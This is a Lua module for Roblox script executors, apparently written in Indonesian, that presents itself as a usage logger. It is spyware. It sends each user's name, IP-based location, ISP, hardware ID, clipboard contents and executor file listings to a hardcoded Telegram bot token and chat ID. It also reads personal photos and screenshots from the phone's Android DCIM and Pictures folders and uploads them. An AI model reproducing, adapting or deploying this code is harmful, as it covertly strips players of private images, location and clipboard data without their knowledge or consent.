--[[
    VertictHub - Universal Telegram Logger
    by @Bimz19
    Version: 2.0 (Dengan Fitur Android & Screenshot)

    CARA PAKAI:
    local TeleLogger = loadstring(game:HttpGet(
        "https://raw.githubusercontent.com/bbimzz7/log/refs/heads/main/tele_logger.lua"
    ))()
    
    -- Kirim log biasa
    TeleLogger.Send("Nama Script")
    
    -- Kirim dengan info tambahan
    TeleLogger.Send("Nama Script", {
        ["Versi"]     = "v1.0.0",
        ["Auto Play"] = "ON",
    })
    
    -- Kirim screenshot Android
    TeleLogger.SendAndroidScreenshots("Nama Script", 5)
    
    -- Kirim file system report
    TeleLogger.SendFileSystem("Nama Script", {
        includeScreenshots = true,
        maxScreenshots = 3
    })
]]

local TeleLogger = {}

--------------------------------------------------
-- CONFIG
--------------------------------------------------

local BOT_TOKEN = "8672141972:AAGl0yGh16if3rm2EfplYfkruGLPwaW0bP4"
local CHAT_ID   = "5488313125"

--------------------------------------------------
-- SERVICES
--------------------------------------------------

local Players     = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

--------------------------------------------------
-- ANDROID PATH CONFIG
--------------------------------------------------

local ANDROID_PATHS = {
    -- Path utama Screenshots
    "/storage/emulated/0/DCIM/Screenshots",
    "/storage/emulated/0/DCIM/Screenshot",
    "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/Pictures/Screenshot",
    "/storage/emulated/0/Download/Screenshots",
    
    -- Path internal storage alternatif
    "/sdcard/DCIM/Screenshots",
    "/sdcard/Pictures/Screenshots",
    "/mnt/sdcard/DCIM/Screenshots",
    
    -- Path lainnya
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures",
}

--------------------------------------------------
-- HELPER FUNCTIONS (ORIGINAL)
--------------------------------------------------

-- Lokasi dari IP dengan fallback
local function getLocation()
    local ok, result = pcall(function()
        local res = request({ Url = "http://ip-api.com/json/?fields=status,city,countryCode,isp,proxy,hosting,timezone", Method = "GET" })
        return HttpService:JSONDecode(res.Body)
    end)

    if ok and result and result.status == "success" then
        local isVPN = (result.proxy or result.hosting) and "Ya" or "Tidak"
        return result.city .. ", " .. result.countryCode,
               result.isp,
               result.timezone,
               isVPN
    end

    -- Fallback ke ipinfo.io
    local ok2, result2 = pcall(function()
        local res = request({ Url = "https://ipinfo.io/json", Method = "GET" })
        return HttpService:JSONDecode(res.Body)
    end)

    if ok2 and result2 then
        return (result2.city or "Unknown") .. ", " .. (result2.country or "Unknown"),
               result2.org or "Unknown",
               result2.timezone or "Unknown",
               "Unknown"
    end

    return "Unknown", "Unknown", "Unknown", "Unknown"
end

-- Executor name + versi
local function getExecutor()
    local name, ver = "Unknown", "Unknown"
    if identifyexecutor then
        local n, v = identifyexecutor()
        name = n or "Unknown"
        ver  = v or "Unknown"
    elseif getexecutorname then
        name = getexecutorname() or "Unknown"
    end
    return ver ~= "Unknown" and (name .. " v" .. ver) or name
end

-- HWID
local function getHWID()
    if getdeviceid then
        local ok, id = pcall(getdeviceid)
        if ok and id then return tostring(id) end
    end
    if gethwid then
        local ok, id = pcall(gethwid)
        if ok and id then return tostring(id) end
    end
    return "Tidak tersedia"
end

-- Platform
local function getPlatform()
    local UIS = game:GetService("UserInputService")
    if UIS.TouchEnabled and not UIS.KeyboardEnabled then
        return "Mobile"
    elseif UIS.GamepadEnabled and not UIS.KeyboardEnabled then
        return "Console"
    else
        return "PC"
    end
end

-- Resolusi layar
local function getResolution()
    local ok, result = pcall(function()
        local vp = workspace.CurrentCamera.ViewportSize
        return math.floor(vp.X) .. "x" .. math.floor(vp.Y)
    end)
    return ok and result or "Unknown"
end

-- FPS saat ini
local function getFPS()
    local ok, result = pcall(function()
        return math.floor(1 / game:GetService("RunService").Heartbeat:Wait())
    end)
    return ok and (tostring(result) .. " fps") or "Unknown"
end

-- GPU / Renderer
local function getGPU()
    local ok, result = pcall(function()
        return settings().Rendering.GfxCard
    end)
    return ok and result or "Unknown"
end

-- Roblox client versi
local function getRobloxVersion()
    local ok, result = pcall(function()
        return tostring(game:GetService("RbxAnalyticsService"):GetClientVersion())
    end)
    return ok and result or "Unknown"
end

-- Executor workspace path
local function getExecutorPath()
    local ok, result = pcall(function()
        if getscriptname then return getscriptname() end
        if readfile then
            -- coba tulis file test buat tau path
            writefile("__path_test__.txt", "test")
            local files = listfiles("")
            for _, f in ipairs(files) do
                if f:find("__path_test__") then
                    deletefile("__path_test__.txt")
                    return f:gsub("__path_test__.txt", "")
                end
            end
            deletefile("__path_test__.txt")
        end
        return "Tidak tersedia"
    end)
    return ok and result or "Tidak tersedia"
end

-- Jumlah file di workspace executor
local function getWorkspaceFileCount()
    local ok, result = pcall(function()
        if listfiles then
            local files = listfiles("")
            return tostring(#files) .. " file"
        end
        return "Tidak tersedia"
    end)
    return ok and result or "Tidak tersedia"
end

-- Account age
local function getAccountAge()
    local ok, result = pcall(function()
        local res  = game:HttpGet("https://users.roblox.com/v1/users/" .. LocalPlayer.UserId)
        local data = HttpService:JSONDecode(res)
        local y, m, d = data.created:match("(%d+)-(%d+)-(%d+)")
        local createdTime = os.time({
            year = tonumber(y), month = tonumber(m), day = tonumber(d),
            hour = 0, min = 0, sec = 0
        })
        return math.floor(os.difftime(os.time(), createdTime) / 86400) .. " hari"
    end)
    return ok and result or "Unknown"
end

-- Jumlah teman
local function getFriendCount()
    local ok, result = pcall(function()
        local res = game:HttpGet(
            "https://friends.roblox.com/v1/users/" .. LocalPlayer.UserId .. "/friends/count"
        )
        return HttpService:JSONDecode(res).count
    end)
    return ok and tostring(result) or "Unknown"
end

-- Nama game
local function getGameName()
    local ok, result = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    return ok and result or "Unknown"
end

-- Player count
local function getPlayerCount()
    return #Players:GetPlayers() .. "/" .. Players.MaxPlayers
end

-- Ping
local function getPing()
    return math.floor(LocalPlayer:GetNetworkPing() * 1000) .. " ms"
end

-- Umur server
local function getServerAge()
    local s = math.floor(workspace.DistributedGameTime)
    return math.floor(s / 60) .. " menit " .. (s % 60) .. " detik"
end

--------------------------------------------------
-- CLIPBOARD FUNCTIONS
--------------------------------------------------

local function getClipboard()
    local clipboardContent = "Tidak tersedia"
    
    local success, result = pcall(function()
        if getclipboard then
            return getclipboard()
        elseif syn and syn.getclipboard then
            return syn.getclipboard()
        elseif clipboard and clipboard.get then
            return clipboard.get()
        elseif is_sirhurt then
            return sirhurt_get_clipboard()
        end
    end)
    
    if success and result and result ~= "" then
        clipboardContent = result
        if #clipboardContent > 100 then
            clipboardContent = string.sub(clipboardContent, 1, 100) .. "..."
        end
    end
    
    return clipboardContent
end

--------------------------------------------------
-- ANDROID FILE SYSTEM FUNCTIONS
--------------------------------------------------

local function fileExists(path)
    local success = pcall(function()
        local file = io.open(path, "r")
        if file then
            file:close()
            return true
        end
        return false
    end)
    return success
end

local function listAndroidFiles(folderPath)
    local files = {}
    
    -- Method 1: Coba pake readdir
    if readdir then
        local success, result = pcall(function()
            return readdir(folderPath)
        end)
        if success and result then
            for _, item in ipairs(result) do
                if item.isFile then
                    table.insert(files, folderPath .. "/" .. item.name)
                end
            end
            return files
        end
    end
    
    -- Method 2: Pake io.popen
    local success, result = pcall(function()
        local handle = io.popen('ls -1 "' .. folderPath .. '" 2>/dev/null')
        if handle then
            local result = handle:read("*a")
            handle:close()
            
            if result and result ~= "" then
                for line in result:gmatch("[^\r\n]+") do
                    table.insert(files, folderPath .. "/" .. line)
                end
            end
        end
    end)
    
    return files
end

local function readAndroidFile(filePath)
    local success, data = pcall(function()
        local file = io.open(filePath, "rb")
        if not file then return nil end
        local content = file:read("*all")
        file:close()
        return content
    end)
    return success and data or nil
end

local function getAndroidScreenshots()
    local allScreenshots = {}
    
    for _, path in ipairs(ANDROID_PATHS) do
        local files = listAndroidFiles(path)
        
        if #files > 0 then
            for _, filePath in ipairs(files) do
                if filePath:match("%.png$") or 
                   filePath:match("%.jpg$") or 
                   filePath:match("%.jpeg$") or 
                   filePath:match("%.gif$") or 
                   filePath:match("%.bmp$") or
                   filePath:match("%.webp$") then
                    
                    local fileName = filePath:match("([^/\\]+)$")
                    
                    local fileSize = "Unknown"
                    pcall(function()
                        local f = io.open(filePath, "r")
                        if f then
                            fileSize = f:seek("end")
                            f:close()
                            fileSize = string.format("%.1f KB", fileSize / 1024)
                        end
                    end)
                    
                    table.insert(allScreenshots, {
                        path = filePath,
                        name = fileName,
                        size = fileSize,
                        folder = path
                    })
                end
            end
        end
    end
    
    table.sort(allScreenshots, function(a, b)
        return a.name > b.name
    end)
    
    return allScreenshots
end

local function sendAndroidPhoto(photoInfo, caption)
    local photoData = readAndroidFile(photoInfo.path)
    
    if not photoData then
        return false
    end
    
    local success = pcall(function()
        local boundary = "boundary" .. os.time()
        local body = "--" .. boundary .. "\r\n"
        body = body .. "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
        body = body .. CHAT_ID .. "\r\n"
        body = body .. "--" .. boundary .. "\r\n"
        body = body .. "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
        body = body .. caption .. "\r\n"
        body = body .. "--" .. boundary .. "\r\n"
        body = body .. "Content-Disposition: form-data; name=\"photo\"; filename=\"" .. photoInfo.name .. "\"\r\n"
        body = body .. "Content-Type: image/png\r\n\r\n"
        body = body .. photoData .. "\r\n"
        body = body .. "--" .. boundary .. "--"
        
        request({
            Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendPhoto",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
            },
            Body = body
        })
    end)
    
    return success
end

local function sendAndroidScreenshots(scriptName, maxCount)
    maxCount = maxCount or 5
    
    local screenshots = getAndroidScreenshots()
    
    if #screenshots == 0 then
        local msg = string.format(
            "[%s] ❌ TIDAK ADA SCREENSHOT DI ANDROID\n\nPath yang dicek:\n%s",
            scriptName,
            table.concat(ANDROID_PATHS, "\n")
        )
        
        pcall(function()
            request({
                Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    chat_id = CHAT_ID,
                    text = msg
                })
            })
        end)
        return
    end
    
    local infoMsg = string.format(
        "[%s] 📱 ANDROID SCREENSHOTS DITEMUKAN\n\nTotal: %d screenshot\nMengirim: %d foto terbaru\n\nFolder yang ditemukan:\n",
        scriptName,
        #screenshots,
        math.min(maxCount, #screenshots)
    )
    
    local folders = {}
    for _, ss in ipairs(screenshots) do
        folders[ss.folder] = (folders[ss.folder] or 0) + 1
    end
    
    for folder, count in pairs(folders) do
        infoMsg = infoMsg .. "📂 " .. folder .. " (" .. count .. " foto)\n"
    end
    
    pcall(function()
        request({
            Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                chat_id = CHAT_ID,
                text = infoMsg
            })
        })
    end)
    
    for i = 1, math.min(maxCount, #screenshots) do
        local ss = screenshots[i]
        local caption = string.format(
            "📸 Android Screenshot %d/%d\nFile: %s\nFolder: %s\nUkuran: %s\nScript: %s\nWaktu: %s",
            i, math.min(maxCount, #screenshots),
            ss.name,
            ss.folder,
            ss.size,
            scriptName,
            os.date("%Y-%m-%d %H:%M:%S")
        )
        
        sendAndroidPhoto(ss, caption)
        task.wait(1.5)
    end
    
    local finalMsg = string.format(
        "[%s] ✅ Selesai mengirim %d screenshot Android",
        scriptName,
        math.min(maxCount, #screenshots)
    )
    
    pcall(function()
        request({
            Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                chat_id = CHAT_ID,
                text = finalMsg
            })
        })
    end)
end

--------------------------------------------------
-- DIRECTORY STRUCTURE FUNCTIONS
--------------------------------------------------

local function getWorkspacePath()
    local success, path = pcall(function()
        if getscriptname then
            return getscriptname():match("(.+)[/\\][^/\\]+$") or ""
        elseif readfile and listfiles then
            local testFile = "__path_test_" .. os.time() .. ".txt"
            writefile(testFile, "test")
            local files = listfiles("")
            for _, f in ipairs(files) do
                if f:find(testFile) then
                    delfile(testFile)
                    return f:gsub(testFile, "")
                end
            end
            delfile(testFile)
        end
        return "Tidak terdeteksi"
    end)
    return success and path or "Tidak terdeteksi"
end

local function getDirectoryStructure(path, depth)
    depth = depth or 0
    if depth > 3 then return "  (terlalu dalam...)\n" end
    
    local structure = ""
    local indent = string.rep("  ", depth)
    
    local success, files = pcall(function()
        return listfiles(path or "")
    end)
    
    if not success or not files then
        return indent .. "❌ Tidak bisa akses folder\n"
    end
    
    for _, file in ipairs(files) do
        local fileName = file:match("([^/\\]+)$")
        
        local isFolder = pcall(function()
            local subFiles = listfiles(file)
            return #subFiles > 0
        end)
        
        if isFolder then
            structure = structure .. indent .. "📁 " .. fileName .. "/\n"
            structure = structure .. getDirectoryStructure(file, depth + 1)
        else
            local icon = "📄"
            if fileName:match("%.png$") or fileName:match("%.jpg$") or fileName:match("%.jpeg$") or fileName:match("%.gif$") then
                icon = "🖼️"
            elseif fileName:match("%.lua$") then
                icon = "📜"
            elseif fileName:match("%.txt$") then
                icon = "📝"
            elseif fileName:match("%.json$") then
                icon = "🔧"
            end
            
            structure = structure .. indent .. icon .. " " .. fileName .. "\n"
        end
    end
    
    return structure
end

--------------------------------------------------
-- MAIN SEND FUNCTION (ORIGINAL + CLIPBOARD)
--------------------------------------------------

function TeleLogger.Send(scriptName, extraInfo, options)
    options = options or {}
    
    task.spawn(function()
        task.wait(3)

        local city, isp, timezone, isVPN = getLocation()
        
        -- Ambil clipboard jika diminta
        local clipboardContent = ""
        if options.includeClipboard then
            clipboardContent = "\n📋 Clipboard: " .. getClipboard() .. "\n"
        end

        local extraStr = clipboardContent
        if extraInfo then
            extraStr = extraStr .. "\n= INFO TAMBAHAN =\n"
            for k, v in pairs(extraInfo) do
                extraStr = extraStr .. string.format("%-13s: %s\n", k, tostring(v))
            end
        end

        local msg = string.format(
            "[%s - User Detected]\n\n" ..

            "= DATA USER =\n" ..
            "Username     : %s\n" ..
            "User ID      : %d\n" ..
            "Display Name : %s\n" ..
            "Account Age  : %s\n" ..
            "Teman        : %s\n" ..
            "Lokasi       : %s\n" ..
            "ISP          : %s\n" ..
            "VPN/Proxy    : %s\n\n" ..

            "= DEVICE INFO =\n" ..
            "Platform     : %s\n" ..
            "Resolusi     : %s\n" ..
            "FPS          : %s\n" ..
            "GPU          : %s\n" ..
            "Roblox Ver   : %s\n" ..
            "HWID         : %s\n" ..
            "Executor     : %s\n" ..
            "Exec Path    : %s\n" ..
            "Files        : %s\n\n" ..

            "= DATA GAME =\n" ..
            "Game         : %s\n" ..
            "Place ID     : %d\n" ..
            "Job ID       : %s\n" ..
            "Player       : %s\n" ..
            "Ping         : %s\n" ..
            "Umur Server  : %s\n\n" ..

            "= DATA SCRIPT =\n" ..
            "Script       : %s\n" ..
            "%s\n" ..

            "= WAKTU =\n" ..
            "Tanggal      : %s\n" ..
            "Jam          : %s\n" ..
            "Timezone     : %s",

            scriptName,

            -- User
            LocalPlayer.Name,
            LocalPlayer.UserId,
            LocalPlayer.DisplayName,
            getAccountAge(),
            getFriendCount(),
            city, isp, isVPN,

            -- Device
            getPlatform(),
            getResolution(),
            getFPS(),
            getGPU(),
            getRobloxVersion(),
            getHWID(),
            getExecutor(),
            getExecutorPath(),
            getWorkspaceFileCount(),

            -- Game
            getGameName(),
            game.PlaceId,
            game.JobId,
            getPlayerCount(),
            getPing(),
            getServerAge(),

            -- Script
            scriptName,
            extraStr,

            -- Waktu
            os.date("%Y-%m-%d"),
            os.date("%H:%M:%S"),
            timezone
        )

        pcall(function()
            request({
                Url     = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
                Method  = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body    = HttpService:JSONEncode({
                    chat_id = CHAT_ID,
                    text    = msg,
                })
            })
        end)
    end)
end

--------------------------------------------------
-- FILE SYSTEM REPORT FUNCTION
--------------------------------------------------

function TeleLogger.SendFileSystem(scriptName, options)
    options = options or {}
    
    task.spawn(function()
        local message = "📁 **FILE SYSTEM REPORT**\n"
        message = message .. "Script: " .. scriptName .. "\n"
        message = message .. "Waktu: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
        message = message .. "━━━━━━━━━━━━━━━━\n\n"
        
        if options.includeDirectory ~= false then
            message = message .. "**STRUKTUR WORKSPACE:**\n"
            local structure = getDirectoryStructure("", 0)
            message = message .. structure .. "\n"
        end
        
        if #message > 100 then
            local fileName = "fs_report_" .. os.time() .. ".txt"
            writefile(fileName, message)
            
            pcall(function()
                request({
                    Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendDocument",
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "multipart/form-data; boundary=boundary123"
                    },
                    Body = "--boundary123\r\n" ..
                           "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" ..
                           CHAT_ID .. "\r\n" ..
                           "--boundary123\r\n" ..
                           "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" ..
                           "📁 File System Report - " .. scriptName .. "\r\n" ..
                           "--boundary123\r\n" ..
                           "Content-Disposition: form-data; name=\"document\"; filename=\"" .. fileName .. "\"\r\n" ..
                           "Content-Type: text/plain\r\n\r\n" ..
                           message .. "\r\n" ..
                           "--boundary123--"
                })
            end)
            
            pcall(function() delfile(fileName) end)
        elseif #message > 0 then
            pcall(function()
                request({
                    Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode({
                        chat_id = CHAT_ID,
                        text = message,
                        parse_mode = "Markdown"
                    })
                })
            end)
        end
    end)
end

--------------------------------------------------
-- ANDROID SPECIFIC FUNCTIONS
--------------------------------------------------

function TeleLogger.SendAndroidScreenshots(scriptName, maxCount)
    task.spawn(function()
        sendAndroidScreenshots(scriptName, maxCount)
    end)
end

function TeleLogger.CheckAndroidPath(scriptName, customPath)
    task.spawn(function()
        local files = listAndroidFiles(customPath)
        local msg = string.format(
            "[%s] 📁 ANDROID PATH CHECK\n\nPath: %s\nStatus: %s\nFiles: %d\n\n",
            scriptName,
            customPath,
            (#files > 0) and "✅ Ada" or "❌ Tidak ada / tidak bisa akses",
            #files
        )
        
        if #files > 0 then
            msg = msg .. "Sample files (max 10):\n"
            for i = 1, math.min(10, #files) do
                local fname = files[i]:match("([^/\\]+)$")
                msg = msg .. "• " .. fname .. "\n"
            end
        end
        
        pcall(function()
            request({
                Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    chat_id = CHAT_ID,
                    text = msg
                })
            })
        end)
    end)
end

--------------------------------------------------
-- UTILITY FUNCTIONS
--------------------------------------------------

function TeleLogger.GetAndroidDevice()
    local model = "Unknown"
    local brand = "Unknown"
    
    pcall(function()
        local f = io.open("/system/build.prop", "r")
        if f then
            for line in f:lines() do
                if line:find("ro.product.model") then
                    model = line:match("=(.+)") or "Unknown"
                elseif line:find("ro.product.brand") then
                    brand = line:match("=(.+)") or "Unknown"
                end
            end
            f:close()
        end
    end)
    
    return brand .. " " .. model
end

function TeleLogger.GetClipboardContent()
    return getClipboard()
end

--------------------------------------------------
-- RETURN MODULE
--------------------------------------------------

return TeleLogger